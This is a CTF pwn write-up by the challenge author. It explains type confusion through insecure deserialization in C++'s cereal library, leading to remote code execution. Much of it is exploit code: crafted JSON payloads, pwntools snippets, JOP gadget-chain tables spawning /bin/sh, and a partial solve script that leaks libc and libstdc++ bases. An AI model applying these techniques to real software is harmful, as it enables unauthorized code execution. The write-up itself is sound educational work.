---
title: "Sharing is Caring: Arbitrary Code Execution for Breakfast"
excerpt: Turning happy little accidents into CTF challenges has never been more rewarding.
tags:
  - pwn
  - ctf
  - cpp
  - research
  - writeup
thumbnail_src: assets/popashell.jpg
thumbnail_banner: false
related:
    tags: [infosec, ctf]
---

Deserialization attacks have grown in popularity over the past decade, with major code execution flaws hitting giants such as [Microsoft Sharepoint](https://thehackernews.com/2025/07/hackers-exploit-sharepoint-zero-day.html?m=1)— even in 2025. But what if we could perform deserialization attacks in C++?

Recently, I designed a CTF pwn challenge demonstrating deserialization attacks on a C++ program written with the [cereal library](https://github.com/USCiLab/cereal).

In this post, we'll walk through this challenge, revisit C++ internals, and explore binary exploitation techniques beyond {% abbr "ROP", "Return-Oriented Programming" %}. We’ll learn how even a properly written C++ program could be vulnerable to remote code execution thanks to insecure deserialization.

## The Challenge

{% alert "info" %}
The CTF has ended, but the binaries are public! If you want to try solving it or want to follow along, you can grab the challenge distribution pack [*here*](https://github.com/Thehackerscrew/2025.crewc.tf/blob/32e7548fb6c25e5511194e75a142fbcc41aebc8f/files/c7db6392685529a5ed8b2cb51fd46184/dist.zip)! 
{% endalert %}

- Name: Breakfast  
- Solves: [11](https://github.com/Thehackerscrew/2025.crewc.tf/blob/32e7548fb6c25e5511194e75a142fbcc41aebc8f/api/v1/challenges/28/index.json)
- Difficulty: Easy-Medium?  
- Description:
	> They say breakfast is the most important meal of the day. But sometimes you just need milk to avoid Confusing your favourite Type of cereal...

The code is short, but don't let that fool you. A lot of serialization stuff is abstracted by the [cereal library](https://github.com/USCiLab/cereal).

```cpp {data-label=breakfast.cpp .line-numbers}
#include <cereal/archives/json.hpp>
#include <cereal/types/memory.hpp>
#include <cereal/types/string.hpp>
#include <iostream>
#include <memory>
#include <sstream>
#include <string>

struct Congee
{
    uint64_t ingredients[8];
    
    template <class Archive>
    void serialize(Archive& ar) { ar(CEREAL_NVP(ingredients)); }

    friend std::ostream& operator<<(std::ostream& os, const Congee& c) {
        for (auto i = 0; i < std::size(c.ingredients); i++)
            os << (i == 0 ? "" : " ") << c.ingredients[i];
        return os;
    }
};

struct Toast
{
    uint64_t spread;

    Toast(uint64_t spread = 0) : spread{spread} {}
    virtual void eat() { std::cout << "Mmm- crunchy!" << std::endl; }

    template <class Archive>
    void serialize(Archive& ar) { ar(CEREAL_NVP(spread)); }

    friend std::ostream& operator<<(std::ostream& os, const Toast& t) { return os << t.spread; }
};

struct Fruit
{
    std::string name;
    
    template <class Archive>
    void serialize(Archive& ar) { ar(CEREAL_NVP(name)); }
    
    friend std::ostream& operator<<(std::ostream& os, const Fruit& e) { return os << e.name;  }
};

int main(int argc, char**)
{
    std::cout << "Gonna pop to the store to buy some milk for breakfast.\n";
    std::cout << "Keep this data safe for me while I'm gone, alright?\n\n";

    std::stringstream ss;

    {
        cereal::JSONOutputArchive archive(ss, cereal::JSONOutputArchive::Options::NoIndent());
        std::shared_ptr<Congee> c = std::make_shared<Congee>();
        std::shared_ptr<Toast> t = std::make_shared<Toast>(Toast{42});
        std::shared_ptr<Fruit> f = std::make_shared<Fruit>(Fruit{"Apple"});
        archive(c, t, f);
    }
    std::string s = ss.str();
    s.erase(std::remove(s.begin(), s.end(), '\n'), s.end());
    std::cout << s << "\n\n";

    do
    {
        std::cout << "Remind me of the data again? ";
        std::string input;
        std::getline(std::cin, input);

        std::stringstream ss(input);
        cereal::JSONInputArchive archive(ss);

        std::shared_ptr<Congee> c;
        std::shared_ptr<Toast> t;
        std::shared_ptr<Fruit> f;
        archive(c, t, f);
        std::cout << "\nc: " << *c << std::endl;
        std::cout << "t: " << *t << std::endl;
        std::cout << "f: " << *f << std::endl;
        t->eat();
    } while (1);
}
```

The code first outputs the serialization of three types: `Congee`, `Toast`, and `Fruit`. Then it enters a loop which deserializes input and prints the deserialized values.

Running it in the terminal:

```sh {.command-line data-prompt="$" data-output=2-100}
./breakfast
Gonna pop to the store to buy some milk for breakfast.
Keep this data safe for me while I'm gone, alright?

{"value0": {"ptr_wrapper": {"id": 2147483649,"data": {"ingredients": {"value0": 0,"value1": 0,"value2": 0,"value3": 0,"value4": 0,"value5": 0,"value6": 0,"value7": 0}}}},"value1": {"polymorphic_id": 1073741824,"ptr_wrapper": {"id": 2147483650,"data": {"spread": 42}}},"value2": {"ptr_wrapper": {"id": 2147483651,"data": {"name": "Apple"}}}}

Remind me of the data again? 
```

## C++ Internals Redux

To better understand the program and how the exploitation works, let's review some C++!

If you're familiar, you may want to skip ahead to [the analysis](#analysis).

### What are shared pointers?

Shared pointers (`std::shared_ptr`) are smart pointers in C++ that enable **multiple pointers** to manage the lifetime of a **single object**. They use **reference counting** to track how many `shared_ptr` objects point to the same dynamically allocated resource. The object is automatically deleted when the last remaining `shared_ptr` pointing to it is destroyed or reset. This provides automatic memory management while allowing shared ownership.

{% alert "success" %}
Key Point for Exploitation: **Multiple** shared pointers may share a **single** object, which requires complex (de)serialization procedures to encode and decode.
{% endalert %}

Example:

```cpp
#include <iostream>
#include <memory>

class Resource {
public:
    Resource() { std::cout << "Resource acquired\n"; }
    ~Resource() { std::cout << "Resource destroyed\n"; }
    void use() { std::cout << "Resource used\n"; }
};

int main() {
    // Create a shared_ptr that manages a new Resource
    std::shared_ptr<Resource> ptr1 = std::make_shared<Resource>();
    
    {
        // Create another shared_ptr that shares ownership
        std::shared_ptr<Resource> ptr2 = ptr1;
        
        std::cout << "Inside inner scope - ";
        ptr2->use(); // Both pointers can use the resource
        
        // ptr2 will be destroyed here, but resource remains
    }
    
    std::cout << "Outside inner scope - ";
    ptr1->use(); // ptr1 still keeps the resource alive
    
    // ptr1 destroyed here → reference count reaches 0 → resource destroyed
    return 0;
}
```

Output:

```text {data-lang-off}
Resource acquired
Inside inner scope - Resource used
Outside inner scope - Resource used
Resource destroyed
```

### What are virtual tables?

A **vtable** (virtual table) is the mechanism that enables runtime polymorphism in C++.

- Each virtual class (any class containing virtual functions) has **one** corresponding virtual table (vtable).
  
  {% image "https://pabloariasal.github.io/assets/img/posts/vtables/vpointer.png", "jw-100 alpha-img", "Example of how virtual classes, vtables, and overriding virtual functions is implemented. Credit: Pablo Arias" %}
  
  <sup>Example of how virtual classes, vtables, and overriding virtual functions is implemented. Credit: Pablo Arias</sup>
  {.caption}

  {.no-center}

- The vtable stores an **array of virtual functions**.
- Each **object** of a virtual class **holds a virtual pointer** (vpointer) which points to the vtable they are instantiated with. The vpointer is a "hidden first member" and precedes other members.
- When a virtual function is called, dynamic dispatch is carried out by looking up the vtable then jumping to a function at a hard-coded offset. In assembly, this could be seen as a double dereference.
	```asm
	; precondition: rax contains the address of the object
	mov    rdx,QWORD PTR [rax] ; first dereference (get VTable)
	mov    rdx,QWORD PTR [rdx+0] ; second dereference (get function inside VTable)
	call   rdx                 ; call the function
	```

For further reading, I recommend checking out: [Understanding Virtual Tables in C++ by Pablo Arias](https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/) and [this StackOverflow Q&A](https://stackoverflow.com/a/99341/10239789).

{% alert "success" %}
Key Points for Exploitation: 1) If an attacker controls the vpointer, they can hijack control flow. 2) The vpointer is the first member of any object of a virtual class.
{% endalert %}

### What is an `std::string`?

We all know what a string is in programming, but what does C++'s `std::string` look like?

If we dig into the source code, we see the implementation is roughly equivalent to:

```cpp
template <class CharT>
struct basic_string {
    CharT* buffer;
  	size_t size; // size_t == uint64_t on 64-bit systems.
    size_t capacity;
};
using string = basic_string<char>;
```

Ignoring short-string optimisation and other factors, an `std::string` simply consists of three members: the buffer (a pointer to the actual characters), the size, and the capacity of the dynamically allocated memory.

This allows for a growable string, suitable for dynamic operations such as append, replace, and remove.

{% alert "success" %}
Key Point for Exploitation: If we control `buffer` and can observe the string, we can achieve arbitrary memory read.
{% endalert %}

## Analysis

### Initial Analysis

First step: Understanding what we have, aka enumeration. What protections are in place? What attack primitives are available?

Protections are typically easy to check. Running `checksec`, we see **NX**/**PIE** are enabled. This means shellcode is out of the question. By default, **ASLR** is also enabled, so we'll want some kind of address leak to do anything useful.

{% image "assets/breakfast_checksec.png", "jw-60", "Checksec shows most binary protections are enabled." %}

Looking at the code, we see 3 classes deserialized.

```cpp
struct Congee
{
    uint64_t ingredients[8];
};

struct Toast
{
    uint64_t spread;
    virtual void eat() { /* ... */ }
};

struct Fruit
{
    std::string name;
};

// ...

std::cout << "Remind me of the data again? ";
std::string input;
std::getline(std::cin, input); // Read input

std::stringstream ss(input);
cereal::JSONInputArchive archive(ss);

std::shared_ptr<Congee> c;
std::shared_ptr<Toast> t;
std::shared_ptr<Fruit> f;
archive(c, t, f); // Deserialization happens here!
std::cout << "\nc: " << *c << std::endl;
std::cout << "t: " << *t << std::endl;
std::cout << "f: " << *f << std::endl;
t->eat();
```

Cereal supports serialization of `std::shared_ptr`. But how are shared references handled?

Cereal's JSON format uses an `id` key for shared pointers. If `id` is greater than `2 << 30` (2147483648), then the object is new and memory should be allocated for it. Otherwise, the object was seen before and the old `std::shared_ptr` should be copied.

For instance, here's a sample JSON cereal-isation containing shared references:
```json
[
	{"ptr_wrapper": {"id": 2147483649, "data": "..." } },
	{"ptr_wrapper": {"id": 2147483650, "data": "..." } },
	{"ptr_wrapper": {"id": 1} },
	{"ptr_wrapper": {"id": 2} }
]
```

In the above code example, 2147483649 and 2147483650 refer to new objects with ID 1 and 2. Memory is dynamically allocated and object data is deserialized. Afterwards, the deserializer encounters `"id": 1` which refers to the first object. No new data is deserialized, and the first `std::shared_ptr` is copied.

We've figured out how Cereal handles shared references, but how can we apply it to the challenge?

Well, what if *force* a shared reference, even if the deserialized types are *different*?

### Type Confusion Primitives

It turns out Cereal does not perform type checking. So if the deserialization handles multiple types, we can abuse it for type confusion!

I'll share a deep-dive into the type confusion primitives in a future post. For now, it suffices to understand *what* primitives are available in this challenge and *how* to achieve those primitives.

Here are the types again, for reference:

```cpp
struct Congee {
    uint64_t ingredients[8];
};
struct Toast {
    // uint64_t vptr; // <-- implicit vpointer member due to the virtual function
    uint64_t spread;
    virtual void eat() { /* ... */ }
};
struct Fruit {
    std::string name;
};
```

{% table %}

| If we deserialize a... | followed by a... | we get...                  | because we...            |
| ---------------------- | ---------------- | -------------------------- | ------------------------ |
| Toast                  | Fruit            | Address Leak (ASLR Bypass) | leak the vtable          |
| Congee                 | Fruit            | Arbitrary Memory Read      | control string internals |
| Congee                 | Toast            | Control Flow Hijacking     | control the vpointer     |

{% endtable %}

For instance:
- We have control over one type, say `Toast`.
- We trick Cereal into thinking the second type (`Fruit`) is a `Toast`. This way, we force a `Fruit` and `Toast` to **share the same memory**.
- When `Fruit` is used, C++ gets confuses. It tries to print `Fruit::name`, but instead it actually prints `*Toast::vptr` (the vtable entry of `Toast`). Calamity!

{% image "assets/breakfast_type_confusion.png", "jw-80 alpha-imgv", "Diagram of Type Confusion on Toast and Fruit." %}

Together, these primitives are enough to obtain arbitrary code execution!

## Exploitation

Great, we've found the chink in the armor. Now let's draft a plan of attack.

1. Leak the VTable address. (`Toast` → `Fruit`) We can use this to calculate the base address of the binary and offsets to other locations (e.g. {% abbr "GOT", "Global Offset Table" %} entries). This will be useful to bypass ASLR/PIE.
2. Leak a libc/libcpp address. (`Congee` → `Fruit`) This allows us to calculate offsets to gadgets.
3. Find a heap address. (`Congee` → `Fruit`) We'll need this address for the next step.
4. Hijack control flow to point to a crafted gadget chain. (`Congee` → `Toast`) We'll use the 64 bytes available in `Congee` to plant a fake vtable containing a gadget chain. When the virtual function is called, the chain is triggered.

### Leaking the VTable

Leaking the vtable is rather straightforward. We simply set the `id` of the `Fruit` object to refer to the `Toast` object. But wait— since `Fruit` is a string, we should make sure the size is non-zero. Luckily, we can control the size using the `spread` parameter.

To recap, by type-confusing `Fruit` and controlling `spread`, we map `Toast`'s vpointer to `Fruit`'s string buffer and `Toast`'s `spread` parameter to `Fruit`'s string size.

```json {data-label=vtable_leak_json}
{
    "value0": { // Congee (unused this time)
        "ptr_wrapper": {
            "id": 2147483649, // id = 1
            "data": {
                "ingredients": {
                    // ...
                }
            }
        }
    },
    "value1": { // Toast
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 2147483650, // id = 2
            "data": {
                "spread": 8 // Control the size of the fake string
            }
        }
    },
    "value2": { // Fruit
        "ptr_wrapper": {
            "id": 2 // Refer to the Toast object
        }
    }
}
```

When deserialized, `t` and `f` share the same object. When `*f` is printed, it will dereference the string buffer (vpointer) and print the first entry of the vtable, which is `Toast::eat`.

```cpp {.line-numbers data-start=76}
archive(c, t, f); // Deserialization happens here
std::cout << "\nc: " << *c << std::endl;
std::cout << "t: " << *t << std::endl;
std::cout << "f: " << *f << std::endl; // Vtable address leaked
```

We can do a quick PoC with `xxd`, which will allow us to view nonprintable bytes. By changing the initial JSON's `value1.ptr_wrapper.data.spread` and `value2.ptr_wrapper.id` fields, we can induce the binary to spit out 8 weird bytes, which happen to be an address leak of `0x560864bd50c2`! (Hint: It's in little endian, so read the leaked number backwards.)

{% image "assets/breakfast_test_with_xxd.png", "jw-100", "By controlling spread and Fruit's id, we were able to leak 8 bytes of the vtable entry." %}


{% alert "fact" %}

**Going Deeper**

The PoC was successful. But what if things didn’t go as planned? To debug at a lower level, we can open gdb/gef/pwndbg and break after the deserialization step.

{% image "assets/breakfast_pwndbg_demo.png", "jw-100", "Notice that we successfully type-confused t and f as they share the same object." %}

By printing `t` and `f`, we see that they share the same object.

{% endalert %}

(Note: If an image ever looks too small, try clicking and zooming in on it.)

### Arbitrary Memory Read!

Now that we have an address from the binary, we can continue on our warpath by leaking a libc address. We’ll use the `Congee` → `Fruit` primitive which allows control over the properties of an `std::string` and grants us arbitrary memory read!

```json {data-label=mem_read_json}
{
    "value0": { // Congee
        "ptr_wrapper": {
            "id": 2147483649, // id = 1
            "data": {
                "ingredients": {
                    "value0": %d, // Control the string buffer
                    "value1": %d, // Control the string size
                    "value2": %d, // Control the string capacity (optional)
                    "value3": 0,
                    "value4": 0,
                    "value5": 0,
                    "value6": 0,
                    "value7": 0
                }
            }
        }
    },
    "value1": { // Toast (unused this time)
        // ...
    },
    "value2": { // Fruit
        "ptr_wrapper": {
            "id": 1 // Refer to Congee object
        }
    }
}
```

We'll use the GOT entry of `malloc` as the string buffer. GOT entries are a fixed relative offset in the binary, so we can calculate it using our earlier vtable leak. When the string is printed, the GOT entry will be dereferenced and we get the address of `malloc`.

```python
got_malloc = vtable_addr - e.sym['_ZN5Toast3eatEv'] + e.got['malloc']
bytes_ = send_json(mem_read_json % (got_malloc, 8, 32)) # % (buffer, size, capacity)
malloc_addr = u64(bytes_)
libc_base = malloc_addr - libc.sym['malloc']
```

### Finding the Heap Address

{% details "Why do we need a heap address?" %}
During the final stage of type confusion, we will be controlling a malicious *vpointer* (not the *vtable*!). To actually get control flow hijacking, we want the vpointer to point to a vtable, which will be our custom-crafted payload placed among the 7 remaining quadwords of `Congee`. Thus, we need a heap address to the chunk where `Congee` will be allocated.
{% enddetails %}

To get a heap address leak, we can use the same memorty read primitive and target an address which *contains a heap address*. There are several approaches.

1. One way is to obtain the main arena, which can be found from libc offset `+0x203ac0`. This then necessitates a convoluted hunt for heap addresses through a sea of indirection.
	```python
	main_arena_offset = 0x203ac0
	main_arena_bins_offset = main_arena_offset + (0xb30 - 0xac0)
	main_arena_bins_size = 0x7f0
	bytes_ = send_json(mem_read_json % (libc_base + main_arena_bins_offset, main_arena_bins_size, main_arena_bins_size))
	# More convoluted parsing...
	```

2. Alternatively, a simpler method I observed from submissions is to take advantage of the `cereal::base64::chars` string declared globally in the binary.
	```cpp
	namespace cereal
	{
	  namespace base64
	  {
	    static const std::string chars =
	      "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	      "abcdefghijklmnopqrstuvwxyz"
	      "0123456789+/";
	```
	By reading from this memory, we can leak the heap-allocated buffer of `cereal::base64::chars`.
	```python
	base64_chars_addr = vtable_addr + e.sym['_ZN6cereal6base64L5charsE'] - e.sym['_ZN5Toast3eatEv']
	bytes_ = send_json(mem_read_json % (base64_chars_addr, 8, 32))
    heap_addr = u64(bytes_)
	```

For the sake of simplicity, we'll stick with the `cereal::base64::chars` method.

### Finding Congee's Address

By observation, `Congee`’s address remains unchanged between iterations. This means if we know the address of Congee this iteration, we can reuse that address next iteration.

{% image "assets/breakfast_congee_address_unchanged.png", "jw-100", "Notice how the address of the Congee object (c) is consistent across repeated deserializations." %}

Interestingly, the offset of `c` from the *heap's base address* is constant, and we can calculate it to be `+0x131c0`... at least locally.

{% image "assets/breakfast_congee_heap_offset.png", "jw-100", "" %}

### Finding Congee's Address: Less Hacky Method

Perhaps that seems too hacky or inelegant to some. What if the offset was random? That would likely be the case in a more complex C++ program, one with heaps of memory allocation and deallocation. In that case, I offer an alternative approach.

We can use the bytes in `Congee` to store a canary/needle— some kind of fixed string or pattern. Using our leaked heap address as a reference, we'll perform a giant memory read (e.g. `0x1000` bytes) and look for the needle.

In the following code, we'll look for the fixed pattern `ABCD` (`0x41424344`) in Congee.

```python
# Find a heap address
base64_chars_addr = vtable_addr + e.sym['_ZN6cereal6base64L5charsE'] - e.sym['_ZN5Toast3eatEv']
bytes_ = send_json(mem_read_json % (base64_chars_addr, 8, 32))
heap_addr = u64(bytes_)
print(f'{heap_addr=:#x}')

# Find the Congee chunk
length, needle = 0x1000, 0x41424344
bytes_ = send_json(mem_read_json % (heap_addr, length, needle))
assert len(bytes_) == length, f'expected to read {length} bytes'
assert p64(needle) in bytes_, 'unable to find needle in the haystack, maybe try a larger search length?'
found_addr = heap_addr + bytes_.index(p64(needle)) - 16
print(f'FOUND THE CONGEE CHUNK! - {found_addr=:#x}')
```

## Arbitrary Code Execution (ACE) via Gadget Chains

We finally have enough information to get code execution! To do so, we will construct a gadget chain in `Congee` and craft the payload such that the virtual function call `t->eat()` will trigger the chain.

{% image "assets/breakfast_virtual_function_call.png", "jw-80 alpha-imgv", "" %}

<sup>1) When `toast->eat()` is called, the vtable is looked up. Due to type confusion, it actually uses a vpointer we control. 2) We control the vpointer to point to a vtable within the same `Congee` payload. The vtable contains a gadget which is called.</sup>
{.caption}

Essentially, by controlling the vpointer and vtable, we control the virtual function being called. But how do we craft a malicious function? The answer lies in gadgets.

### PCOP / JOP

Classic ROP gadgets end in `ret`. Upon hitting the `ret`, the Instruction Pointer is set to the next item on the stack. Hence, gadgets could be chained by writing a block of memory to the stack.

PCOP/JOP is similar, but end in different instructions.

- PCOP (Pure Call Oriented Programming): ends in `call SOMETHING` which **directly jumps** to the next gadget
- JOP (Jump Oriented Programming): ends in a `jmp`/`call` which jumps to a **dispatcher**, before jumping into a table of gadgets. The dispatcher's job is to increment a "gadget pointer" before jumping to the next gadget. ^[For further reading on JOP, I recommend reading this StackExchange answer: [Security.SE: Concept of Jump-Oriented-Programming (JOP)](https://security.stackexchange.com/questions/201196/concept-of-jump-oriented-programming-jop). It provides an excellent summary and brief history on ROP/JOP.]
  ```asm
  dispatch:
    add rax, 8
    jmp [rax]
  ```

The advantage of PCOP/JOP is that they don't rely on the stack, but rather on the state of the registers. Instead of stack-based instructions such as `pop` and `ret`, we prefer instructions such as `mov` and `call`.

- ROP Gadget: `pop rax; ret`.
- PCOP/JOP Gadget: `mov rax, [rdi+8]; call [rax+0x10]`

### Approach 1: libstdc++ & One-Gadget

Funnily enough, this was the first working solution I came up with— and it's also the shortest payload I've seen so far (4 quads!).

A **One-Gadget** is a gadget which pops a shell if certain conditions are met. We can find these gadgets using the [`one_gadget` tool](https://github.com/david942j/one_gadget).

```sh {.command-line data-prompt="$" data-output=2-100}
one_gadget -f /usr/lib/x86_64-linux-gnu/libc.so.6
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

From here, we should check which conditions could be achieved; but to do so, we should first understand the state of the registers **at the moment the virtual function is called**. This calls for some breakpoints!

{% image "assets/breakfast_navigate_to_toast_eat_see_regs.png", "jw-100", "Disassembly and registers upon reaching Toast::eat(). Notice the register states of rax, rdi, rsi, and r13. These will be useful when hunting for gadgets." %}

<sup>Disassembly and registers upon reaching `Toast::eat()`, reachable via `b *main+1121; si`.</sup>
{.caption}

By navigating to `Toast::eat()`, we notice the following interesting register states:

- `rax == rdi`: non-controllable, address of virtual object (`&*t`)
	{% image "assets/breakfast_address_of_t.png", "jw-60", "" %}
- `rdx`: controllable, first address to jump to
- `rsi == r13 == 0`

Our attention then turns to fulfilling the one-gadget constraints. I decided to look for gadgets supporting the third one-gadget (offset `0xef4ce`) due to the relatively simple conditions: we just need `rbx = r12 = 0`. We can hunt for gadgets with tools such as [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) or [`xgadget`](https://github.com/entropic-security/xgadget). The gadgets we're looking for should:

1. Overwrite (or provide some control over) the desired registers.
2. The final `call` instruction of a gadget should jump to a desirable offset within `Congee`, e.g. `call [rax+0x10]`.
3. We should also *exclude* gadgets relying on the stack. This means any gadget containing `pop`, `leave`, and `ret`.^[We exclude stack-based gadgets to simplify the exploit, even if an attack with such gadgets may be possible. The reason for doing so is that we don’t have direct control over stack memory. We would need the help of gadgets to push/modify the stack. Even then, modifying the stack without fine-grained control potentially crashes the program. So we explore other alternatives first.]

{% image "assets/breakfast_finding_r12.png", "jw-100", "" %}

<sup>Output of `xgadget --reg-overwrite r12 --jop /usr/lib/x86_64-linux-gnu/libstdc++.so.6`. We found a useful `mov r12, rsi` gadget which sets `r12` to 0. Additionally, the gadget will go to `[rax+0x10]` meaning we can place another gadget at the `+0x10` offset to continue the chain.</sup>
{.caption}

After a while, we ended up with two simple gadgets from `libstdc++`. Constructing the final payload is simply a matter of cooking congee with the right ingredients:

```json {data-label=vptr_hijack_json}
{
    "value0": { // Congee
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "ingredients": {
                    "value0": %d, // Control the vpointer
                    "value1": %d, // Rest of the payload, gadgets, etc...
                    "value2": %d, // ...
                    "value3": %d, // ...
                    "value4": 0,
                    "value5": 0,
                    "value6": 0,
                    "value7": 0
                }
            }
        }
    },
    "value1": { // Toast
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 1 // Refer to the Congee object
        }
    },
    "value2": { // Fruit (unused)
        // ...
    }
}
```

Congee Ingredients:

{% table %}

| Offset | Value                      | Purpose                                                                               |
|--------|----------------------------|---------------------------------------------------------------------------------------|
| `0x00` | address of Congee + `0x08` | vpointer, points to offset `0x08`                                                     |
| `0x08` | `libstdcpp + 0xf0a0c`      | first gadget, `mov r12, rsi; call qword ptr [rax+0x10];`                              |
| `0x10` | `libstdcpp + 0xf5e83`      | second gadget, `mov rbx, rsi; mov rsi, rdi; mov rdi, r12; call qword ptr [rax+0x18];` |
| `0x18` | `libc + 0xef4ce`           | one-gadget, sweet sweet code execution!                                               |

{% endtable %}

The gadget flow is extremely straightforward:
1. VTable is at Congee address + `0x08` →
2. gadget at `0x08` (set `r12` to 0) →
3. gadget at `0x10` (set `rbx` to 0) →
4. gadget at `0x18` (one-gadget ACE).

Putting it all together, we get ACE.

{% image "assets/breakfast_full_script_demo.png", "jw-50", "" %}


### Approach 2: `system("/bin/sh")` Gadget Chain

Credit: Adapted from @erge’s and @lolc4t’s solutions.

I'm sure this gadget chain feels closer to home for ROPpers. The chain works by setting `rdi` to `"/bin/sh"` and calling the `system` function. Despite the need for 6 quads in Congee, I find the chain rather fascinating as it condenses multiple steps into 2 key gadgets.

Another nice aspect about this chain is that it does not rely on too much register state, only `rax` and `rdi` are used. (The libstdc++ and one-gadget chain relies on `rsi = 0` which may not always be the case.)

Congee Ingredients:

{% table %}

| Offset | Value                      | Purpose                                           |
| ------ | -------------------------- | ------------------------------------------------- |
| `0x00` | address of Congee + `0x10` | vpointer                                          |
| `0x08` | address of Congee + `0x18` | address of [system, binsh, gadget2] structure     |
| `0x10` | `libc + 0x1740b1`          | first gadget, `mov rax, [rdi+8]; call [rax+0x10]` |
| `0x18` | `system`                   | sweet sweet code execution!                       |
| `0x20` | `&"/bin/sh"`               | address of any `/bin/sh` string                   |
| `0x28` | `libc + 0xa5688`           | second gadget, `mov rdi, [rax+8]; call [rax]`     |

{% endtable %}

The call flow is:
1. VTable is at Congee address + `0x10` →
2. gadget at `0x10` (set `rax` to `*(rdi+0x08)`, which is the second Congee entry, or in other words: Congee address + `0x18`) →
3. gadget at `0x28` (set `rdi` to `"/bin/sh"`) →
4. gadget at `0x18` (`system` ACE).

To make the this gadget chain work, we require the system, binsh, and `0xa5688` gadget to be **contiguous in memory**. This is because after `mov rax` in the first gadget, the subsequent assembly will `call [rax+0x10]`, which triggers the second gadget to copy `[rax+0x08]` to `rdi` before `call [rax]`. Each entry in this relative `+0x10`, `+0x08`, and `+0x00` have their unique role to play.

The order of the other gadgets don’t matter as much. Here’s one of the solves from the CTF community. Notice how the first gadget (`libc + 0x1740b1`) is placed at the end of the Congee payload instead of at offset `0x10`.

```python
'ingredients': {
	'value0': target_addr + 0x38, # <-- target_addr, rax, rdi
	'value1': target_addr + 0x10,
	'value2': libc.sym.system,
	'value3': next(libc.search(b'/bin/sh')),
	'value4': libc_base + 0xa5688, # mov rdi, [rax+8]; call [rax]
	'value5': 0x4646464646464646,
	'value6': 0x4747474747474747,
	'value7': libc_base + 0x1740b1, # mov rax, [rdi+8]; call [rax+0x10]
}
```

<sup>Alternative solution by @lolc4t.</sup>
{.caption}

## Conclusion

This was an interest challenge to make as it helped refresh my binary exploitation skills despite me sucking at pwn challenges. I was also happy that players came up with different solutions, challenging my biases on what makes a successful gadget chain.

Overall, this has been a fun experience exploring and exploiting a niche use case of C++ serialization libraries. I have a few variant challenges I might present in future CTFs. We'll see if they make it out.

Special thanks to [thehackerscrew CTF team](https://www.thehackerscrew.team/) for hosting my CTF challenge and to the players who opened my mind by sharing their solves.

<a id="logical-end-of-article"></a>

## Solve Script

```python
from pwn import *
import re

# context.log_level = 'debug'
p = process(['breakfast'])
e = ELF('breakfast')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libcpp = ELF('/usr/lib/x86_64-linux-gnu/libstdc++.so.6')

vtable_leak_json = """{
    "value0": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "ingredients": {
                    "value0": 0,
                    "value1": 0,
                    "value2": 0,
                    "value3": 0,
                    "value4": 0,
                    "value5": 0,
                    "value6": 0,
                    "value7": 0
                }
            }
        }
    },
    "value1": {
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 2147483650,
            "data": {
                "spread": 8
            }
        }
    },
    "value2": {
        "ptr_wrapper": {
            "id": 2
        }
    }
}"""

mem_read_json = """{
    "value0": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "ingredients": {
                    "value0": %d,
                    "value1": %d,
                    "value2": %d,
                    "value3": 0,
                    "value4": 0,
                    "value5": 0,
                    "value6": 0,
                    "value7": 0
                }
            }
        }
    },
    "value1": {
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 2147483650,
            "data": {
                "spread": 0
            }
        }
    },
    "value2": {
        "ptr_wrapper": {
            "id": 1
        }
    }
}"""

vptr_hijack_json = """{
    "value0": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "ingredients": {
                    "value0": %d,
                    "value1": %d,
                    "value2": %d,
                    "value3": %d,
                    "value4": %d,
                    "value5": %d,
                    "value6": 0,
                    "value7": 0
                }
            }
        }
    },
    "value1": {
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 1
        }
    },
    "value2": {
        "ptr_wrapper": {
            "id": 2147483650,
            "data": {
                "name": "Apple"
            }
        }
    }
}"""


def send_json(contents: str, skip_output=False):
    line = re.sub(r'\s+', '', contents)
    p.sendline(line.encode())

    if skip_output:
        return None
    
    # Parse output....
    p.recvuntil(b'\nc: ')
    _data1 = p.recvuntil(b'\n', drop=True)

    p.recvuntil(b'\nf: ')
    bytes3 = p.recvuntil(b'\nMmm- crunchy!', drop=True)

    return bytes3


print('\nleak vtable address')
bytes_ = send_json(vtable_leak_json)
vtable_addr = u64(bytes_)
print(f'{vtable_addr=:#x}')

print('\nfind libc address')
got_malloc = vtable_addr + e.got['malloc'] - e.sym['_ZN5Toast3eatEv']
print(f'{got_malloc=:#x}')
bytes_ = send_json(mem_read_json % (got_malloc, 8, 32))

malloc_addr = u64(bytes_)
print(f'{malloc_addr=:#x}')
libc_base = malloc_addr - libc.sym['malloc']
print(f'{libc_base=:#x}')
assert (libc_base & 0xfff) == 0

print('\nfind libc++ address')
got_throw = vtable_addr + e.got['__cxa_throw'] - e.sym['_ZN5Toast3eatEv']
print(f'{got_throw=:#x}')
bytes_ = send_json(mem_read_json % (got_throw, 8, 32))

throw_addr = u64(bytes_)
libcpp_base = throw_addr - libcpp.sym['__cxa_throw']
print(f'{libcpp_base=:#x}')
